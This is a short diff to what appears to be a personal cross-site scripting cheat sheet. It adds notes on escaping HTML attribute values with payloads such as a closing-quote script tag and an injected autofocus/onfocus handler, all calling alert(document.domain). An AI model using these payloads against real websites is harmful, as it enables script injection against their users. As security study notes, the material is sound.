@@ -27,4 +27,9 @@ Some useful ways of executing JavaScript are:
 <img src=1 onerror=alert(1)>
 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 2. XSS in HTML tag ATTributes
+if xss is in attribute value we may be able to bypass it using
+"><script>alert(document.domain)</script>
+or something like this
+" autofocus onfocus=alert(document.domain) x="  -----> introduce some new attribute
+
 
